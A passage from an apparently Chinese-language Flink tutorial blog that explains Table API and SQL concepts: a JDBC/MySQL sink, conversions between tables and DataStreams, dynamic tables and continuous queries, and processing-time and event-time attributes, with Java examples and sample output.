class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-jdbc_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 可以创建Table来描述MySql中的数据，作为输入和输出  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table jdbcOutputTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; cnt bigint not null &quot;</span> +</span><br><span class="line">  <span class="string">&quot;) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;jdbc&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.url&#x27; = &#x27;jdbc:mysql://localhost:3306/test&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.table&#x27; = &#x27;sensor_count&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.driver&#x27; = &#x27;com.mysql.jdbc.Driver&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.username&#x27; = &#x27;root&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.password&#x27; = &#x27;123456&#x27; )&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);<span class="comment">// 执行DDL创建表</span></span><br><span class="line">aggResultSqlTable.insertInto(<span class="string">&quot;jdbcOutputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="表和流的转换"><a href="#表和流的转换" class="headerlink" title="表和流的转换"></a>表和流的转换</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106479537">Flink- 将表转换成DataStream | 查看执行计划 | 流处理和关系代数的区别 | 动态表 | 流式持续查询的过程 | 将流转换成动态表 | 持续查询 | 将动态表转换成 DS</a></p></blockquote><h5 id="将Table转换成DataStream"><a href="#将Table转换成DataStream" class="headerlink" title="将Table转换成DataStream"></a>将Table转换成DataStream</h5><ul><li><p> 表可以转换为 DataStream 或 DataSet ，这样自定义流处理或批处理程序就可以继续在 Table API 或 SQL 查询的结果上运行了 </p></li><li><p> 将表转换为 DataStream 或 DataSet 时，需要指定生成的数据类型，即要将表的每一行转换成的数据类型 </p></li><li><p> 表作为流式查询的结果，是动态更新的 </p></li><li><p> 转换有两种转换模式：追加（Appende）模式和撤回（Retract）模式 </p></li><li><p>追加模式 </p><ul><li>用于表只会被插入（Insert）操作更改的场景<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Row&gt; resultStream = tableEnv.toAppendStream(resultTable,Row.class);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>撤回模式 </p><ul><li> 用于任何场景。有些类似于更新模式中Retract模式，它只有Insert和Delete两类操作。 </li><li> <strong>得到的数据会增加一个Boolean类型的标识位（返回的第一个字段），用它来表示到底是新增的数据（Insert），还是被删除的数据（Delete）</strong>。<br><em>(更新数据，会先删除旧数据，再插入新数据)</em> </li></ul></li></ul><h5 id="将DataStream转换成表"><a href="#将DataStream转换成表" class="headerlink" title="将DataStream转换成表"></a>将DataStream转换成表</h5><ul><li><p> 对于一个DataStream，可以直接转换成Table，进而方便地调用Table API做转换操作  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; dataStream = ...</span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream);</span><br></pre></td></tr></table></figure></li><li><p> 默认转换后的Table schema和DataStream中的字段定义一一对应，也可以单独指定出来  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; dataStream = ...</span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, timestamp as ts, temperature&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="创建临时视图-Temporary-View"><a href="#创建临时视图-Temporary-View" class="headerlink" title="创建临时视图(Temporary View)"></a>创建临时视图(Temporary View)</h5><ul><li><p> 基于DataStream创建临时视图  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>,dataStream);</span><br><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>,</span><br><span class="line">                            dataStream, <span class="string">&quot;id, timestamp as ts, temperature&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p> 基于Table创建临时视图  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>, sensorTable);</span><br></pre></td></tr></table></figure></li></ul><h4 id="查看执行计划"><a href="#查看执行计划" class="headerlink" title="查看执行计划"></a>查看执行计划</h4><ul><li> Table API 提供了一种机制来解释计算表的逻辑和优化查询计划 </li><li>查看执行计划，可以通过<code>TableEnvironment.explain(table)</code>方法或<code>TableEnvironment.explain()</code>方法完成，返回一个字符串，描述三个计划 <ul><li>优化的逻辑查询计划</li><li>优化后的逻辑查询计划</li><li>实际执行计划<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String explaination = tableEnv.explain(resultTable);</span><br><span class="line">System.out.println(explaination);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="流处理和关系代数的区别"><a href="#流处理和关系代数的区别" class="headerlink" title="流处理和关系代数的区别"></a>流处理和关系代数的区别</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106479537">Flink- 将表转换成DataStream | 查看执行计划 | 流处理和关系代数的区别 | 动态表 | 流式持续查询的过程 | 将流转换成动态表 | 持续查询 | 将动态表转换成 DS</a></p></blockquote><pre><code>Table API和SQL，本质上还是基于关系型表的操作方式；而关系型表、关系代数，以及SQL本身，一般是有界的，更适合批处理的场景。这就导致在进行流处理的过程中，理解会稍微复杂一些，需要引入一些特殊概念。可以看到，其实**关系代数（主要就是指关系型数据库中的表）和SQL，主要就是针对批处理的，这和流处理有天生的隔阂。**</code></pre><table><thead><tr><th></th><th>关系代数(表)/SQL</th><th>流处理</th></tr></thead><tbody><tr><td>处理的数据对象</td><td>字段元组的有界集合</td><td>字段元组的无限序列</td></tr><tr><td>查询（Query）对数据的访问</td><td>可以访问到完整的数据输入</td><td>无法访问所有数据，必须持续”等待”流式输入</td></tr><tr><td>查询终止条件</td><td>生成固定大小的结果集后终止</td><td>永不停止，根据持续收到的数据不断更新查询结果</td></tr></tbody></table><h5 id="动态表-Dynamic-Tables"><a href="#动态表-Dynamic-Tables" class="headerlink" title="动态表(Dynamic Tables)"></a>动态表(Dynamic Tables)</h5><pre><code>我们可以**随着新数据的到来，不停地在之前的基础上更新结果**。这样得到的表，在Flink Table API概念里，就叫做“动态表”（Dynamic Tables）。</code></pre><ul><li>动态表是 Flink 对流数据的 Table API 和 SQL 支持的核心概念</li><li>与表示批处理数据的静态表不同，动态表是随时间变化的</li><li>持续查询(Continuous Query) <ul><li>动态表可以像静态的批处理表一样进行查询，查询一个动态表会产生<strong>持续查询（Continuous Query）</strong></li><li><strong>连续查询永远不会终止，并会生成另一个动态表</strong></li><li>查询（Query）会不断更新其动态结果表，以反映其动态输入表上的更改。</li></ul></li></ul><h5 id="动态表和持续查询"><a href="#动态表和持续查询" class="headerlink" title="动态表和持续查询"></a>动态表和持续查询</h5><p><img src="https://img-blog.csdnimg.cn/20200601190927869.png###id=wWyXo&originHeight=140&originWidth=867&originalType=binary&ratio=1&status=done&style=none"></p><p>流式表查询的处理过程：</p><ol><li> 流被转换为动态表 </li><li> 对动态表计算连续查询，生成新的动态表 </li><li> 生成的动态表被转换回流 </li></ol><h5 id="将流转换成动态表"><a href="#将流转换成动态表" class="headerlink" title="将流转换成动态表"></a>将流转换成动态表</h5><ul><li>为了处理带有关系查询的流，必须先将其转换为表</li><li>从概念上讲，流的每个数据记录，都被解释为对结果表的插入（Insert）修改操作</li></ul><p><em>本质上，我们其实是从一个、只有插入操作的changelog（更新日志）流，来构建一个表</em></p><p><em>来一条数据插入一条数据</em></p><p><img src="https://img-blog.csdnimg.cn/20200601191016684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=zsFJJ&originHeight=257&originWidth=707&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="持续查询"><a href="#持续查询" class="headerlink" title="持续查询"></a>持续查询</h5><ul><li> 持续查询，会在动态表上做计算处理，并作为结果生成新的动态表。<br><em>与批处理查询不同，连续查询从不终止，并根据输入表上的更新更新其结果表。</em><br><em>在任何时间点，连续查询的结果在语义上，等同于在输入表的快照上，以批处理模式执行的同一查询的结果。</em> </li></ul><pre><code>下图为一个点击事件流的持续查询，是一个分组聚合做count统计的查询。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200601191112183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ogdlp&originHeight=349&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="将动态表转换成-DataStream"><a href="#将动态表转换成-DataStream" class="headerlink" title="将动态表转换成 DataStream"></a>将动态表转换成 DataStream</h5><ul><li>与常规的数据库表一样，动态表可以通过插入（Insert）、更新（Update）和删除（Delete）更改，进行持续的修改</li><li><strong>将动态表转换为流或将其写入外部系统时，需要对这些更改进行编码</strong></li></ul><hr><ul><li>仅追加（Append-only）流 <ul><li>仅通过插入（Insert）更改来修改的动态表，可以直接转换为仅追加流</li></ul></li><li>撤回（Retract）流 <ul><li> 撤回流是包含两类消息的流：添加（Add）消息和撤回（Retract）消息<br><em>动态表通过将INSERT 编码为add消息、DELETE 编码为retract消息、UPDATE编码为被更改行（前一行）的retract消息和更新后行（新行）的add消息，转换为retract流。</em> </li></ul></li><li>Upsert（更新插入流） <ul><li> Upsert流也包含两种类型的消息：Upsert消息和删除（Delete）消息<br><em>通过将INSERT和UPDATE更改编码为upsert消息，将DELETE更改编码为DELETE消息，就可以将具有唯一键（Unique Key）的动态表转换为流。</em> </li></ul></li></ul><h5 id="将动态表转换成DataStream"><a href="#将动态表转换成DataStream" class="headerlink" title="将动态表转换成DataStream"></a>将动态表转换成DataStream</h5><p><img src="https://img-blog.csdnimg.cn/20200601191549610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=oG4SE&originHeight=492&originWidth=875&originalType=binary&ratio=1&status=done&style=none"></p><h3 id="时间特性-Time-Attributes"><a href="#时间特性-Time-Attributes" class="headerlink" title="时间特性(Time Attributes)"></a>时间特性(Time Attributes)</h3><h4 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h4><ul><li>基于时间的操作（比如 Table API 和 SQL 中窗口操作），需要定义相关的时间语义和时间数据来源的信息</li><li>Table 可以提供一个逻辑上的时间字段，用于在表处理程序中，指示时间和访问相应的时间戳</li><li><strong>时间属性，可以是每个表schema的一部分。一旦定义了时间属性，它就可以作为一个字段引用，并且可以在基于时间的操作中使用</strong></li><li>时间属性的行为类似于常规时间戳，可以访问，并且进行计算</li></ul><h4 id="定义处理时间-Processing-Time"><a href="#定义处理时间-Processing-Time" class="headerlink" title="定义处理时间(Processing Time)"></a>定义处理时间(Processing Time)</h4><ul><li>处理时间语义下，允许表处理程序根据机器的本地时间生成结果。它是时间的最简单概念。它既不需要提取时间戳，也不需要生成 watermark</li></ul><h5 id="由DataStream转换成表时指定"><a href="#由DataStream转换成表时指定" class="headerlink" title="由DataStream转换成表时指定"></a>由DataStream转换成表时指定</h5><ul><li> 在定义 Table Schema 期间，可以使用<code>.proctime</code>，指定字段名定义处理时间字段 </li><li> <strong>这个proctime属性只能通过附加逻辑字段，来扩展物理schema。因此，只能在schema定义的末尾定义它</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, temperature, pt.proctime&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="定义Table-Schema时指定"><a href="#定义Table-Schema时指定" class="headerlink" title="定义Table Schema时指定"></a>定义Table Schema时指定</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">            .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">            .field(<span class="string">&quot;timestamp&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">            .field(<span class="string">&quot;temperature&quot;</span>,DataTypes.DOUBLE())</span><br><span class="line">            .field(<span class="string">&quot;pt&quot;</span>,DataTypes.TIMESTAMP(<span class="number">3</span>))</span><br><span class="line">            .proctime()</span><br><span class="line">           )</span><br></pre></td></tr></table></figure><h5 id="创建表的DDL中定义"><a href="#创建表的DDL中定义" class="headerlink" title="创建表的DDL中定义"></a>创建表的DDL中定义</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table dataTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ts bigint, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; temperature double, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; pt AS PROCTIME() &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;filesystem&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.path&#x27; = &#x27;/sensor.txt&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;format.type&#x27; = &#x27;csv&#x27;)&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);</span><br></pre></td></tr></table></figure><h5 id="测试代码-7"><a href="#测试代码-7" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 读入文件数据，得到DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将流转换成表，定义时间特性</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(dataTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- pt: TIMESTAMP(3) *PROCTIME*</span><br><span class="line"></span><br><span class="line">sensor_1,1547718199,35.8,2021-02-03T16:50:58.048</span><br><span class="line">sensor_6,1547718201,15.4,2021-02-03T16:50:58.048</span><br><span class="line">sensor_7,1547718202,6.7,2021-02-03T16:50:58.050</span><br><span class="line">sensor_10,1547718205,38.1,2021-02-03T16:50:58.050</span><br><span class="line">sensor_1,1547718207,36.3,2021-02-03T16:50:58.051</span><br><span class="line">sensor_1,1547718209,32.8,2021-02-03T16:50:58.051</span><br><span class="line">sensor_1,1547718212,37.1,2021-02-03T16:50:58.051</span><br></pre></td></tr></table></figure><h4 id="定义事件事件-Event-Time"><a href="#定义事件事件-Event-Time" class="headerlink" title="定义事件事件(Event Time)"></a>定义事件事件(Event Time)</h4><ul><li>事件时间语义，允许表处理程序根据每个记录中包含的时间生成结果。这样即使在有乱序事件或者延迟事件时，也可以获得正确的结果。</li><li><strong>为了处理无序事件，并区分流中的准时和迟到事件；Flink需要从事件数据中，提取时间戳，并用来推送事件时间的进展</strong></li><li>定义事件事件，同样有三种方法： <ul><li>由DataStream转换成表时指定</li><li>定义Table Schema时指定</li><li>在创建表的DDL中定义</li></ul></li></ul><h5 id="由DataStream转换成表时指定-1"><a href="#由DataStream转换成表时指定-1" class="headerlink" title="由DataStream转换成表时指定"></a>由DataStream转换成表时指定</h5><ul><li> 由DataStream转换成表时指定（推荐） </li><li> 在DataStream转换成Table，使用<code>.rowtime</code>可以定义事件事件属性  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将DataStream转换为Table，并指定时间字段</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, timestamp.rowtime, temperature&quot;</span>);</span><br><span class="line"><span class="comment">// 或者，直接追加时间字段</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                          <span class="string">&quot;id, temperature, timestamp, rt.rowtime&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="定义Table-Schema时指定-1"><a href="#定义Table-Schema时指定-1" class="headerlink" title="定义Table Schema时指定"></a>定义Table Schema时指定</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">            .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">            .field(<span class="string">&quot;timestamp&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">            .rowtime(</span><br><span class="line">              <span class="keyword">new</span> Rowtime()</span><br><span class="line">              .timestampsFromField(<span class="string">&quot;timestamp&quot;</span>) <span class="comment">// 从字段中提取时间戳</span></span><br><span class="line">              .watermarksPeriodicBounded(<span class="number">1000</span>) <span class="comment">// watermark延迟1秒</span></span><br><span class="line">            )</span><br><span class="line">            .field(<span class="string">&quot;temperature&quot;</span>,DataTypes.DOUBLE())</span><br><span class="line">           )</span><br></pre></td></tr></table></figure><h5 id="创建表的DDL中定义-1"><a href="#创建表的DDL中定义-1" class="headerlink" title="创建表的DDL中定义"></a>创建表的DDL中定义</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table dataTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ts bigint, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; temperature double, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; rt AS TO_TIMESTAMP( FROM_UNIXTIME(ts) ), &quot;</span> +</span><br><span class="line">  <span class="string">&quot; watermark for rt as rt - interval &#x27;1&#x27; second&quot;</span></span><br><span class="line">  <span class="string">&quot; ) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;filesystem&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.path&#x27; = &#x27;/sensor.txt&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;format.type&#x27; = &#x27;csv&#x27;)&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);</span><br></pre></td></tr></table></figure><h5 id="测试代码-8"><a href="#测试代码-8" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 读入文件数据，得到DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> 